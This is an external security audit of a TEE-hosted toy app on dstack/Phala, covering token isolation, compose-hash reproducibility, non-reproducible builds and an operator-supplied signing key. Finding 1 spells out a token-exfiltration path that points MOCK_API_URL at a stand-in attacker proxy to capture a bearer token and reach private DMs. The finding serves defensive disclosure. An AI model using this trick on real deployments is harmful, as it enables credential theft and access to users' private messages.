# Xordi Toy Example App - Vibe Audit

**Date:** 2026-01-28
**Auditor:** External verification
**Target:** xordi-release-process/toy-example-app
**Live Instance:** https://f9d35f495ff3592771e73a528f4fc5737e30224b-8090.dstack-base-prod9.phala.network/

---

## Executive Summary

| Claim | Status | Notes |
|-------|--------|-------|
| Token cannot access DMs | ❌ BROKEN | Operator controls MOCK_API_URL, can exfiltrate token |
| Code verifiable via attestation | ⚠️ PARTIAL | Compose hash exists but not reproducible from git |
| On-chain audit trail | ✅ WORKS | 111 logs on Base contract |
| TEE isolation | ✅ WORKS | Standard dstack/TDX |
| External verification possible | ✅ WORKS | Images public, code verified |

**Critical Issue:** The core security claim is broken. An operator who controls `MOCK_API_URL` can point it to their own server, receive the API token, and use it to access DMs via the real API.

---

## Core Security Claims (From Documentation)

1. **Token Isolation**: Enclave has API token that COULD access sensitive `/api/direct_messages`, but code ONLY calls safe `/api/watch_history`
2. **Code Verifiability**: Attestation proves what code is running via compose hash
3. **On-chain Audit Trail**: Every compose hash change is logged to Base contract
4. **TEE Isolation**: Secrets (token, signing key) cannot be extracted by operator

---

## Live Deployment Data

**Fetched 2026-01-28 from prod9:**

| Field | Value |
|-------|-------|
| App ID | `f9d35f495ff3592771e73a528f4fc5737e30224b` |
| Compose Hash | `1f3bfb8648b9a0626f3b07999d5309e6f56ad4cc0fa8414c8b03c33594c09138` |
| OS Image Hash | `1fbb0cf9cc6cfbf23d6b779776fabad2c5403d643badb9e5e238615e4960a78a` |
| Docker Image | `ghcr.io/account-link/toy-example-enclave:dc0fc12` |

**allowed_envs (operator-configurable at runtime):**
```
MOCK_API_URL          <- CRITICAL: controls where token is sent
MOCK_API_TOKEN        <- The sensitive credential
SIGNING_KEY           <- For attestation signatures
ENVIRONMENT
DSTACK_DOCKER_REGISTRY
DSTACK_DOCKER_USERNAME
DSTACK_DOCKER_PASSWORD
```

---

## Findings

### Finding 1: CRITICAL - Token Exfiltration via Malicious Proxy

**Severity:** CRITICAL

`MOCK_API_URL` is in `allowed_envs`, meaning the operator sets it at deploy time.

**The code in tiktok-client.ts:**
```typescript
const url = `${config.mockApiUrl}/api/watch_history`;
const response = await fetch(url, {
  headers: {
    Authorization: `Bearer ${config.mockApiToken}`,  // Token sent here!
```

**Attack:**
1. Operator deploys with `MOCK_API_URL=https://evil-proxy.attacker.com`
2. Enclave sends `Authorization: Bearer <real-token>` to attacker's server
3. Attacker uses token to call real TikTok API's `/api/direct_messages`

**The code constraint only prevents the enclave from calling DMs directly.** It does NOT prevent the operator from stealing the token.

**Fix Required:** `MOCK_API_URL` must be hardcoded in docker-compose.yml, NOT in allowed_envs.

---

### Finding 2: Compose Hash Derivation is Complex

**Severity:** MEDIUM

**What we can reproduce:**
- CI transforms `docker-compose.yml` with: `sed -i "s|image:.*|image: ghcr.io/account-link/toy-example-enclave:dc0fc12|g"`
- Local hash after transform: `bf0eee69387da1c84a2dd7870e09317b33ab94c2de9237588589bb221b040a3f`
- This matches DEPLOYMENTS.md v1.2.12 ✅

**What we can't directly reproduce:**
- Live attestation shows: `1f3bfb8648b9a0626f3b07999d5309e6f56ad4cc0fa8414c8b03c33594c09138`
- This hash likely includes the full "app-compose" which contains:
  - `docker_compose_file` (the YAML content)
  - `allowed_envs` array
  - `features` array
  - `pre_launch_script`
  - `kms_enabled`, `gateway_enabled`, etc.

**The full app-compose from attestation includes:**
```json
{
  "allowed_envs": ["MOCK_API_URL", "MOCK_API_TOKEN", "SIGNING_KEY", ...],
  "docker_compose_file": "...",
  "features": ["kms", "tproxy-net"],
  "gateway_enabled": true,
  "kms_enabled": true,
  "pre_launch_script": "...(long bash script)...",
  ...
}
```

**Impact:**
- The attested compose hash is over the full app-compose JSON, not just docker-compose.yml
- Pre-launch script and other Phala Cloud settings affect the hash
- Need Phala CLI or dstack tools to reproduce the exact hash

**Verification path:** Use `phala cvms get` or dstack tools to see what compose hash would be generated for a given deployment.

---

### Finding 3: Docker Images Are Now Public ✅

**Status:** RESOLVED (2026-01-28)

Images are now publicly accessible at `ghcr.io/account-link/toy-example-enclave`.

**Verification performed:**
```
Image: ghcr.io/account-link/toy-example-enclave:dc0fc12
Digest: sha256:d6ea4edd071d82ca5d09ad50297a0da5b31bcc8c3f1315da61261f9558ef3fb5
Labels:
  revision: dc0fc120976fc92a4f51e6586fa484669c1750af
  version: 1.2.12
  created: 2026-01-28T21:38:50Z
```

**Code verification result:** All 20 dist/*.js files match byte-for-byte between:
- Local build from source at commit dc0fc12
- GHCR image dc0fc12

| File | Local MD5 | GHCR MD5 | Match |
|------|-----------|----------|-------|
| tiktok-client.js | 3cf43047f3829b5be72946de182819a5 | 3cf43047f3829b5be72946de182819a5 | ✅ |
| index.js | b3b220e07a11a1e75c9a215570b96df6 | b3b220e07a11a1e75c9a215570b96df6 | ✅ |
| config.js | ecb448aa72562ba7a7e7f26fefcd57f2 | ecb448aa72562ba7a7e7f26fefcd57f2 | ✅ |
| signup-counter.js | 796b7b674c7d995aff15abc8615b06d7 | 796b7b674c7d995aff15abc8615b06d7 | ✅ |
| version.js | 6146ca0d36b0b014746ccc9c84df5805 | 6146ca0d36b0b014746ccc9c84df5805 | ✅ |

Image digests differ due to metadata only (timestamps). **Application code is verified identical.**

---

### Finding 4: Builds Are Not Reproducible

**Severity:** MEDIUM

The Dockerfile comment claims:
```dockerfile
# Multi-stage build for reproducibility
# The same source code should produce identical images across builds
```

But the build uses:
- `BUILD_TIME=$(date -u +%Y-%m-%dT%H:%M:%SZ)` - different every build
- No `SOURCE_DATE_EPOCH`
- No `--rewrite-timestamp` in buildx

Same source → different image digests. Cannot independently verify image matches source.

---

### Finding 5: SIGNING_KEY is Operator-Provided, Not TEE-Derived

**Severity:** LOW (documentation inconsistency)

Code comment in signup-counter.ts:
> "In production, the signing key would be derived from TEE attestation"

Reality: `SIGNING_KEY` is in `allowed_envs` - operator provides it.

This means:
- Signatures don't prove TEE origin
- Operator could sign arbitrary data
- The "attestation signature" claim is misleading

---

### Finding 6: Live Hash Not in DEPLOYMENTS.md

**Severity:** LOW (documentation lag)

Live compose hash: `1f3bfb8648b9a0626f3b07999d5309e6f56ad4cc0fa8414c8b03c33594c09138`

Latest in DEPLOYMENTS.md (v1.2.12): `bf0eee69387da1c84a2dd7870e09317b33ab94c2de9237588589bb221b040a3f`

A deployment occurred that wasn't recorded.

---

## Verification Checklist

| Check | Status | Notes |
|-------|--------|-------|
| Can pull Docker image | ✅ | Public, verified |
| Compose hash reproducible from git | ❌ | CI/CD transforms file |
| Image digest reproducible | ❌ | No reproducible build config |
| MOCK_API_URL hardcoded | ❌ | In allowed_envs - operator controls |
| Token cannot be exfiltrated | ❌ | Operator controls destination |
| SIGNING_KEY TEE-derived | ❌ | Operator provides |
| On-chain log exists | ✅ | 111 logs on Base contract |
| Code has no DM endpoint calls | ✅ | Verified via grep |
| Image tag matches commit | ✅ | dc0fc12 matches git |

---

## Code Review Notes

### External Network Calls

Only two files make external HTTP calls:

1. **tiktok-client.ts:46** - `fetch(${config.mockApiUrl}/api/watch_history)`
   - Sends token to operator-controlled URL ← VULNERABILITY

2. **index.ts:37** - `fetch('http://localhost:8090/compose-hash')`
   - Internal dstack metadata service - SAFE

### Positive Security Properties

- No `eval()` or dynamic code execution
- No code that constructs `/api/direct_messages` URL
- Non-root user in container
- Health check configured
- package-lock.json for dependency pinning

---

## Recommendations

### Immediate (Required for Security Claim)

1. **Hardcode MOCK_API_URL in docker-compose.yml**
   - Remove from allowed_envs
   - Prevents token exfiltration

### High Priority

2. **Make Docker images public**
   - Enables external verification

3. **Implement reproducible builds**
   - Add SOURCE_DATE_EPOCH
   - Use buildx rewrite-timestamp
   - Document reproduction steps

### Medium Priority

4. **Document compose hash derivation**
   - Explain CI/CD transformation
   - Provide script to reproduce hash from git commit

5. **Derive SIGNING_KEY from TEE**
   - Use dstack's key derivation
   - Or remove misleading documentation

---

## Questions for Project Team

1. Is the MOCK_API_URL flexibility intentional? What's the use case for operator-configured API URL?

2. Why are images private? Is there sensitive content in the build?

3. What prevents an operator from deploying a modified compose that points to a malicious URL?

---

## Current Status (2026-01-28)

### What We've Verified ✅

1. **Docker image is public and matches source**
   - `ghcr.io/account-link/toy-example-enclave:dc0fc12` pulled successfully
   - All 20 dist/*.js files match byte-for-byte between local build and GHCR
   - Image labels show `revision: dc0fc120976fc92a4f51e6586fa484669c1750af`

2. **Code review confirms no DM access**
   - `tiktok-client.js` only calls `/api/watch_history`
   - No `direct_message` patterns in compiled code

3. **Image tag traceable to git commit**
   - `dc0fc12` = commit "chore: bump version to 1.2.12"

### What We're Stuck On ⏳

**Compose hash reproducibility** - Can't yet reproduce the live attestation hash:
- Live attestation: `1f3bfb8648b9a0626f3b07999d5309e6f56ad4cc0fa8414c8b03c33594c09138`
- Our computed hash (without pre_launch_script): `4e35f09f4077d038034283a94686238c0007e26a67d66b656d7b73be7b71e7d6`
- DEPLOYMENTS.md v1.2.12 hash: `bf0eee69387da1c84a2dd7870e09317b33ab94c2de9237588589bb221b040a3f`

**The gap:** The compose-hash is over `app-compose.json` which includes:
- `docker_compose_file` (we have this)
- `allowed_envs` (we have this)
- `pre_launch_script` (Phala Cloud injects this - we need to get it from 8090)
- Other fields (`features`, `storage_fs`, etc.)

**Next step:** Fetch the raw `app_compose` from the 8090 endpoint to see the exact structure and compute matching hash.

**Reference:** dstack-tutorial/01-attestation-and-reference-values/README.md explains:
- Use `dstack_sdk.get_compose_hash()` for deterministic hashing
- Phala Cloud wraps docker-compose into app-compose.json with additional fields
- The 8090 guest-agent endpoint should expose the full app_compose

### Stumbling Points & How Better Docs Would Help

**1. VERIFICATION.md is wrong about compose hash**
- Doc says: `sha256sum enclave/docker-compose.yml`
- Reality: Hash is over `app-compose.json` which wraps docker-compose + many other fields
- **Fix:** Doc should explain app-compose structure and point to `dstack_sdk.get_compose_hash()`

**2. Image org name mismatch**
- Repo has: `ghcr.io/xordi/toy-example-enclave:latest`
- Deployed: `ghcr.io/account-link/toy-example-enclave:dc0fc12`
- CI does a sed replacement, but this isn't documented
- **Fix:** Document the CI transformation or use a template variable

**3. No way to reproduce compose hash from git alone**
- You need: docker-compose.yml + allowed_envs + pre_launch_script + feature flags
- Phala Cloud injects `pre_launch_script` which isn't in the repo
- **Fix:** Either commit the full app-compose.json, or document how to fetch it from 8090

**4. DEPLOYMENTS.md hash doesn't match live**
- Documented v1.2.12: `bf0eee69...`
- Live attestation: `1f3bfb86...`
- Either a newer undocumented deployment, or hash calculation differs
- **Fix:** Automation should verify hash matches before recording

**5. The MOCK_API_URL security gap**
- Not called out in RED-TEAM.md
- Operator can steal token by pointing to malicious proxy
- **Fix:** Hardcode in compose, remove from allowed_envs

**What would have made verification easier:**
- A script that fetches 8090, extracts app_compose, computes hash
- Pre-built app-compose.json committed to repo (or generated by CI)
- Clear mapping: git commit → image tag → compose hash → on-chain TX

### Key URLs

- Live 8090: `https://f9d35f495ff3592771e73a528f4fc5737e30224b-8090.dstack-base-prod9.phala.network/`
- GHCR image: `ghcr.io/account-link/toy-example-enclave:dc0fc12`
- Tutorial reference: `~/projects/dstack/dstack-tutorial/01-attestation-and-reference-values/`

---

## Appendix: Verification Commands

```bash
# Pull and inspect Docker image
docker pull ghcr.io/account-link/toy-example-enclave:dc0fc12
docker inspect ghcr.io/account-link/toy-example-enclave:dc0fc12 | jq '.[0].Config.Labels'

# Compare local build with GHCR (should match)
docker run --rm ghcr.io/account-link/toy-example-enclave:dc0fc12 find /app/dist -type f -exec md5sum {} \;

# Compute compose hash using dstack SDK
pip install dstack-sdk
python3 -c "from dstack_sdk import get_compose_hash; import json; print(get_compose_hash(json.load(open('app-compose.json'))))"

# Fetch live attestation data
curl -s https://f9d35f495ff3592771e73a528f4fc5737e30224b-8090.dstack-base-prod9.phala.network/

# Verify no DM access in code
grep -rE 'direct_message' toy-example-app/enclave/src/

# Check external calls
grep -rE 'fetch\(' toy-example-app/enclave/src/
```

## Key Files Reference

- Audit doc: `/home/amiller/projects/dstack/vibe-audit/XORDI-TOY-EXAMPLE-AUDIT.md`
- Target repo: `/home/amiller/projects/dstack/vibe-audit/xordi-release-process/toy-example-app/`
- dstack tutorial: `/home/amiller/projects/dstack/dstack-tutorial/`
- Normalized app-compose docs: `/home/amiller/projects/dstack/dstack-tutorial/refs/dstack/docs/normalized-app-compose.md`
